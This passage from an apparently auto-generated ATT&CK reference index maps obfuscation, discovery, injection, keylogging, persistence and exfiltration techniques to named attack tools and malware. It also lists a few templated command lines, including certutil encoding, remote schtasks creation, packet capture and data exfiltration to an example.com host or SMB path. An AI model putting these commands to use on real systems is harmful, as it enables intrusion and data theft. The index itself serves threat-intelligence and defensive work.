- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can generate packed code modules.(Citation: Donut Github)	

## T1027.003 - Steganography

- [Invoke-PSImage](../tools/unknown/invoke-psimage.md) — explicit, source. [Invoke-PSImage](https://attack.mitre.org/software/S0231) can be used to embed a PowerShell script within the pixels of a PNG file.(Citation: GitHub Invoke-PSImage)

## T1027.004 - Compile After Delivery

- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) includes functionality to retrieve source code and compile locally prior to execution in victim environments.(Citation: Cybereason Sliver Undated)

## T1027.005 - Indicator Removal from Tools

- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Find-AVSignature</code> AntivirusBypass module can be used to locate single byte anti-virus signatures.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)

## T1027.007 - Dynamic API Resolution

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can call and dynamically resolve hashed APIs.(Citation: Palo Alto Brute Ratel July 2022)

## T1027.009 - Embedded Payloads

- [Invoke-PSImage](../tools/unknown/invoke-psimage.md) — explicit, source. [Invoke-PSImage](https://attack.mitre.org/software/S0231) can be used to embed payload data within a new image file.(Citation: GitHub PSImage)

## T1027.010 - Command Obfuscation

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has the ability to obfuscate commands using <code>Invoke-Obfuscation</code>.(Citation: Github PowerShell Empire)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of ScriptModification modules that compress and encode scripts and payloads.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)

## T1027.013 - Encrypted／Encoded File

- [Certutil.exe](../tools/windows/certutil.exe.md) — explicit, source. Command metadata lists T1027.013: certutil -encode {PATH} {PATH:.base64}
- [DCRAT](../tools/unknown/dcrat.md) — explicit, source. The [DCRAT](https://attack.mitre.org/software/S9017) configuration file is encrypted using AES-256.(Citation: Zscaler BlindEagle DEC 2025)
- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can generate encrypted, compressed/encoded, or otherwise obfuscated code modules.(Citation: Donut Github)
- [IronNetInjector](../tools/unknown/ironnetinjector.md) — explicit, source. [IronNetInjector](https://attack.mitre.org/software/S0581) can obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads.(Citation: Unit 42 IronNetInjector February 2021 )
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has been encrypted with XOR using different 32-long Base16 strings.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can use string encryption to hinder analysis.(Citation: Fortinet Remcos Campaign NOV 2024)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can encrypt strings at compile time.(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2)

## T1027.015 - Compression

- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can generate encrypted, compressed/encoded, or otherwise obfuscated code modules.(Citation: Donut Github)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has been compressed with LZW algorithm.(Citation: Bitdefender FunnyDream Campaign November 2020)

## T1030 - Data Transfer Size Limits

- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) supports custom chunk sizes used to upload/download files.(Citation: Mythc Documentation)	
- [Rclone](../tools/unknown/rclone.md) — explicit, source. The [Rclone](https://attack.mitre.org/software/S1040) "chunker" overlay supports splitting large files in smaller chunks during upload to circumvent size limits.(Citation: Rclone)(Citation: DFIR Conti Bazar Nov 2021)

## T1033 - System Owner／User Discovery

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can check if the current user of a compromised system is an administrator. (Citation: Telefonica Snip3 December 2021)
- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) can collect information on user sessions.(Citation: CrowdStrike BloodHound April 2018)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can enumerate the username on targeted hosts.(Citation: Talos Frankenstein June 2019)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can identify logged in users across the domain and views user sessions.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021)
- [NBTscan](../tools/unknown/nbtscan.md) — explicit, source. [NBTscan](https://attack.mitre.org/software/S0590) can list active users on the system.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)	
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can enumerate the username and account type.(Citation: CISA AR18-352A Quasar RAT December 2018)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can enumerate the username on targeted hosts.(Citation: Fortinet Remcos Campaign NOV 2024)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can gather a list of logged on users.(Citation: GitHub SILENTTRINITY Modules July 2019) 

## T1036 - Masquerading

- [Diantz.exe](../tools/windows/diantz.exe.md) — explicit, source. Command metadata lists T1036: diantz /f {PATH:.ddf}
- [Makecab.exe](../tools/windows/makecab.exe.md) — explicit, source. Command metadata lists T1036: makecab /F {PATH:.ddf}
- [Msbuild.exe](../tools/windows/msbuild.exe.md) — explicit, source. Command metadata lists T1036: msbuild.exe @{PATH:.rsp}

## T1036.001 - Invalid Code Signature

- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has used an invalid certificate in attempt to appear legitimate.(Citation: Bitdefender FunnyDream Campaign November 2020)

## T1036.004 - Masquerade Task or Service

- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) has attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications.(Citation: Cybereason Kimsuky November 2020)
- [IronNetInjector](../tools/unknown/ironnetinjector.md) — explicit, source. [IronNetInjector](https://attack.mitre.org/software/S0581) has been disguised as a legitimate service using the name PythonUpdateSrvc.(Citation: Unit 42 IronNetInjector February 2021 )

## T1036.005 - Match Legitimate Resource Name or Location

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has used a payload file named OneDrive.update to appear benign.(Citation: Palo Alto Brute Ratel July 2022)
- [Colorcpl.exe](../tools/windows/colorcpl.exe.md) — explicit, source. Command metadata lists T1036.005: colorcpl {PATH}
- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) has been named Readme.txt to appear legitimate.(Citation: Secureworks MCMD July 2019)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has been named `wuauclt.exe` to appear as the legitimate Windows Update AutoUpdate Client.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) spoofed itself as <code>AlphaZawgyl_font.exe</code>, a specialized Unicode font.(Citation: FOX-IT May 2016 Mofang)

## T1036.008 - Masquerade File Type

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has used Microsoft Word icons to hide malicious LNK files.(Citation: Palo Alto Brute Ratel July 2022)

## T1040 - Network Sniffing

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can be used to conduct packet captures on target hosts.(Citation: Github PowerShell Empire)
- [Impacket](../tools/unknown/impacket.md) — explicit, source. [Impacket](https://attack.mitre.org/software/S0357) can be used to sniff network traffic via an interface or raw socket.(Citation: Impacket Tools)
- [NBTscan](../tools/unknown/nbtscan.md) — explicit, source. [NBTscan](https://attack.mitre.org/software/S0590) can dump and print whole packet content.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)	
- [Nmcap.exe](../tools/windows/nmcap.exe.md) — explicit, source. Command metadata lists T1040: nmcap.exe /network * /capture /file {PATH_ABSOLUTE:.cap}
- [Pktmon.exe](../tools/windows/pktmon.exe.md) — explicit, source. Command metadata lists T1040: pktmon.exe filter add -p 445
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains a module for taking packet captures on compromised hosts.(Citation: GitHub PoshC2)
- [Responder](../tools/unknown/responder.md) — explicit, source. [Responder](https://attack.mitre.org/software/S0174) captures hashes and credentials that are sent to the system after the name services have been poisoned.(Citation: GitHub Responder)

## T1041 - Exfiltration Over C2 Channel

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can send data gathered from a target through the command and control channel.(Citation: Github PowerShell Empire)(Citation: Talos Frankenstein June 2019)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has uploaded a file containing debugger logs, network information and system information to the C2.(Citation: QiAnXin APT-C-36 Feb2019)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) can upload files and information from a compromised host to its C2 servers.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.(Citation: GitHub Pupy)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can transfer files from an infected host to the C2 server.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) sent generated reports to the C2 via HTTP POST requests.(Citation: FOX-IT May 2016 Mofang)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can exfiltrate files from the victim using the <code>download</code> command.(Citation: GitHub Sliver Download)

## T1046 - Network Service Discovery

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can conduct port scanning against targeted systems.(Citation: Palo Alto Brute Ratel July 2022)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can perform port scans from an infected host.(Citation: Github PowerShell Empire)
- [FRP](../tools/unknown/frp.md) — explicit, source. As part of load balancing [FRP](https://attack.mitre.org/software/S1144) can set `healthCheck.type = "tcp"` or `healthCheck.type = "http"` to check service status on specific hosts with TCPing or an HTTP request.(Citation: FRP GitHub)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can scan for open TCP ports on the target network.(Citation: Github Koadic)
- [NBTscan](../tools/unknown/nbtscan.md) — explicit, source. [NBTscan](https://attack.mitre.org/software/S0590) can be used to scan IP networks.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)
- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can initiate a port scan against a given IP address.(Citation: Peirates GitHub)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can perform port scans from an infected host.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) has a built-in module for port scanning.(Citation: GitHub Pupy)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can scan for open ports on a compromised machine.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1047 - Windows Management Instrumentation

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use WMI to move laterally.(Citation: Palo Alto Brute Ratel July 2022)
- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) can utilize WMI to install new Grunt listeners through XSL files or command one-liners.(Citation: Github Covenant)
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can execute remote commands using Windows Management Instrumentation.(Citation: CME Github September 2018)	
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use WMI to deliver a payload to a remote host.(Citation: Github PowerShell Empire) 
- [Impacket](../tools/unknown/impacket.md) — explicit, source. [Impacket](https://attack.mitre.org/software/S0357)'s `wmiexec` module can be used to execute commands through WMI.(Citation: Impacket Tools)(Citation: Sygnia VelvetAnt 2024A)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can use WMI to execute commands.(Citation: Github Koadic)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) has a number of modules that use WMI to execute tasks.(Citation: GitHub PoshC2)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-WmiCommand</code> CodeExecution module uses WMI to execute and retrieve the output from a [PowerShell](https://attack.mitre.org/techniques/T1086) payload.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can use WMI for lateral movement.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [wbemtest.exe](../tools/windows/wbemtest.exe.md) — explicit, source. Command metadata lists T1047: wbemtest.exe

## T1048 - Exfiltration Over Alternative Protocol

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can directly download cloud user data such as OneDrive files.(Citation: AADInternals Documentation)
- [TestWindowRemoteAgent.exe](../tools/windows/testwindowremoteagent.exe.md) — explicit, source. Command metadata lists T1048: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000

## T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

- [Rclone](../tools/unknown/rclone.md) — explicit, source. [Rclone](https://attack.mitre.org/software/S1040) can exfiltrate data over SFTP or HTTPS via WebDAV.(Citation: Rclone)

## T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol

- [BITSAdmin](../tools/unknown/bitsadmin.md) — explicit, source. [BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to upload files from a compromised host.(Citation: Microsoft BITSAdmin)
- [Cmd.exe](../tools/windows/cmd.exe.md) — explicit, source. Command metadata lists T1048.003: type {PATH_ABSOLUTE} > {PATH_SMB}
- [Rclone](../tools/unknown/rclone.md) — explicit, source. [Rclone](https://attack.mitre.org/software/S1040) can exfiltrate data over FTP or HTTP, including HTTP via WebDAV.(Citation: Rclone)
- [ftp](../tools/unknown/ftp.md) — explicit, source. [ftp](https://attack.mitre.org/software/S0095) may be used to exfiltrate data separate from the main command and control protocol.(Citation: Microsoft FTP)(Citation: Linux FTP)

## T1049 - System Network Connections Discovery

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can discover active sessions for a targeted system.(Citation: CME Github September 2018)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can enumerate the current network connections of a host.(Citation: Github PowerShell Empire)
- [FRP](../tools/unknown/frp.md) — explicit, source. [FRP](https://attack.mitre.org/software/S1144) can use a dashboard and U/I to display the status of connections from the FRP client and server.(Citation: FRP GitHub)
- [Net](../tools/unknown/net.md) — explicit, source. Commands such as <code>net use</code> and <code>net session</code> can be used in [Net](https://attack.mitre.org/software/S0039) to gather information about network connections from a particular host.(Citation: Savill 1999)
- [Pacu](../tools/unknown/pacu.md) — explicit, source. Once inside a Virtual Private Cloud, [Pacu](https://attack.mitre.org/software/S1091) can attempt to identify DirectConnect, VPN, or VPC Peering.(Citation: GitHub Pacu)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains an implementation of [netstat](https://attack.mitre.org/software/S0104) to enumerate TCP and UDP connections.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) has a built-in utility command for <code>netstat</code>, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.(Citation: GitHub Pupy)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) used the Windows function <code>GetExtendedUdpTable</code> to detect connected UDP endpoints.(Citation: FOX-IT May 2016 Mofang)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can collect network connection information.(Citation: GitHub Sliver Netstat)
- [nbtstat](../tools/unknown/nbtstat.md) — explicit, source. [nbtstat](https://attack.mitre.org/software/S0102) can be used to discover current NetBIOS sessions.
- [netstat](../tools/unknown/netstat.md) — explicit, source. [netstat](https://attack.mitre.org/software/S0104) can be used to enumerate local network connections, including active TCP connections and other network statistics.(Citation: TechNet Netstat)

## T1053.002 - At

- [At.exe](../tools/windows/at.exe.md) — explicit, source. Command metadata lists T1053.002: C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can set a scheduled task on the target system to execute commands remotely using [at](https://attack.mitre.org/software/S0110).(Citation: CME Github September 2018)
- [at](../tools/unknown/at.md) — explicit, source. [at](https://attack.mitre.org/software/S0110) can be used to schedule a task on a system to be executed at a specific date or time.(Citation: TechNet At)(Citation: Linux at)

## T1053.005 - Scheduled Task

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can create a scheduled task to maintain persistence on system start-up.(Citation: Telefonica Snip3 December 2021)
- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) can use the schtasks utility to bypass UAC.(Citation: Cybereason Kimsuky November 2020)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has modules to interact with the Windows task scheduler.(Citation: Github PowerShell Empire)
- [IronNetInjector](../tools/unknown/ironnetinjector.md) — explicit, source. [IronNetInjector](https://attack.mitre.org/software/S0581) has used a task XML file named <code>mssch.xml</code> to run an IronPython script when a user logs in or when specific system events are created.(Citation: Unit 42 IronNetInjector February 2021 )
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) has used scheduled tasks to add persistence.(Citation: MalwareBytes LazyScripter Feb 2021) 
- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) can use scheduled tasks for persistence.(Citation: Secureworks MCMD July 2019)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053).(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.(Citation: Volexity Patchwork June 2018)(Citation: CISA AR18-352A Quasar RAT December 2018)
- [Schtasks.exe](../tools/windows/schtasks.exe.md) — explicit, source. Command metadata lists T1053.005: schtasks /create /s targetmachine /tn "MyTask" /tr "{CMD}" /sc daily
- [schtasks](../tools/unknown/schtasks.md) — explicit, source. [schtasks](https://attack.mitre.org/software/S0111) is used to schedule tasks on a Windows system to run at a specific date and time.(Citation: TechNet Schtasks)

## T1055 - Process Injection

- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) includes a subproject <code>DonutTest</code> to inject shellcode into a target process.(Citation: Donut Github)	
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) contains multiple modules for injecting into processes, such as <code>Invoke-PSInject</code>.(Citation: Github PowerShell Empire)
- [HTRAN](../tools/unknown/htran.md) — explicit, source. [HTRAN](https://attack.mitre.org/software/S0040) can inject into into running processes.(Citation: NCSC Joint Report Public Tools)
- [IronNetInjector](../tools/unknown/ironnetinjector.md) — explicit, source. [IronNetInjector](https://attack.mitre.org/software/S0581) can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.(Citation: Unit 42 IronNetInjector February 2021 )
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. The [PcShare](https://attack.mitre.org/software/S1050) payload has been injected into the `logagent.exe` and `rdpclip.exe` processes.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains multiple modules for injecting into processes, such as <code>Invoke-PSInject</code>.(Citation: GitHub PoshC2)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) has a command to hide itself by injecting into another process.(Citation: Fortinet Remcos Feb 2017)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can inject shellcode directly into Excel.exe or a specific process.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) includes multiple methods to perform process injection to migrate the framework into other, potentially privileged processes on the victim machine.(Citation: Microsoft Sliver 2022)(Citation: Cybereason Sliver Undated)(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2)
- [coregen.exe](../tools/windows/coregen.exe.md) — explicit, source. Command metadata lists T1055: coregen.exe dummy_assembly_name

## T1055.001 - Dynamic-link Library Injection

- [IronNetInjector](../tools/unknown/ironnetinjector.md) — explicit, source. [IronNetInjector](https://attack.mitre.org/software/S0581) has the ability to inject a DLL into running processes, including the [IronNetInjector](https://attack.mitre.org/software/S0581) DLL into explorer.exe.(Citation: Unit 42 IronNetInjector February 2021 )
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can perform process injection by using a reflective DLL.(Citation: Github Koadic)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can migrate into another process using reflective DLL injection.(Citation: GitHub Pupy)

## T1055.002 - Portable Executable Injection

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has injected [Latrodectus](https://attack.mitre.org/software/S1160) into the Explorer.exe process on comrpomised hosts.(Citation: Rapid7 Fake W2 July 2024)

## T1056 - Input Capture

- [NPPSPY](../tools/unknown/nppspy.md) — explicit, source. [NPPSPY](https://attack.mitre.org/software/S1131) captures user input into the Winlogon process by redirecting RPC traffic from legitimate listening DLLs within the operating system to a newly registered malicious item that allows for recording logon information in cleartext.(Citation: Huntress NPPSPY 2022)

## T1056.001 - Keylogging

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can capture keystrokes on the victim’s machine.(Citation: AsyncRAT GitHub)
- [DCRAT](../tools/unknown/dcrat.md) — explicit, source. [DCRAT](https://attack.mitre.org/software/S9017) can log keystrokes on targeted systems.(Citation: Zscaler BlindEagle DEC 2025)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) includes keylogging capabilities for Windows, Linux, and macOS systems.(Citation: Github PowerShell Empire)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a keylogging module.(Citation: Imminent Unit42 Dec2019)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has the ability to capture keystrokes.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages.(Citation: GitHub PoshC2)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Get-Keystrokes</code> Exfiltration module can log keystrokes.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) has a built-in keylogger.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)(Citation: Kaspersky BlindEagle AUG 2024)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) has a command for keylogging.(Citation: Fortinet Remcos Feb 2017)(Citation: Talos Remcos Aug 2018)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) has a keylogging capability.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1056.002 - GUI Input Capture

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692)'s `credphisher.py` module can prompt a current user for their credentials.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1056.004 - Credential API Hooking

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) contains some modules that leverage API hooking to carry out tasks, such as netripper.(Citation: Github PowerShell Empire)

## T1057 - Process Discovery

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can examine running processes to determine if a debugger is present.(Citation: Telefonica Snip3 December 2021)
- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can enumerate all processes and locate specific process IDs (PIDs).(Citation: Palo Alto Brute Ratel July 2022)
- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) includes subprojects that enumerate and identify information about [Process Injection](https://attack.mitre.org/techniques/T1055) candidates.(Citation: Donut Github)	
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can find information about processes running on local and remote systems.(Citation: Github PowerShell Empire)(Citation: Talos Frankenstein June 2019)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a "Process Watcher" feature to monitor processes in case the client ever crashes or gets closed.(Citation: Imminent Unit42 Dec2019)
- [IronNetInjector](../tools/unknown/ironnetinjector.md) — explicit, source. [IronNetInjector](https://attack.mitre.org/software/S0581) can identify processes via C# methods such as <code>GetProcessesByName</code> and running [Tasklist](https://attack.mitre.org/software/S0057) with the Python <code>os.popen</code> function.(Citation: Unit 42 IronNetInjector February 2021 )
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) can obtain a list of running processes on a compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Get-ProcessTokenPrivilege</code> Privesc-PowerUp module can enumerate privileges for a given process.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can list the running processes and get the process ID and parent process’s ID.(Citation: GitHub Pupy)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can discover running processes on compromised machines.(Citation: Fortinet Remcos Campaign NOV 2024)

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can enumerate processes, including properties to determine if they have the Common Language Runtime (CLR) loaded.(Citation: GitHub SILENTTRINITY Modules July 2019)
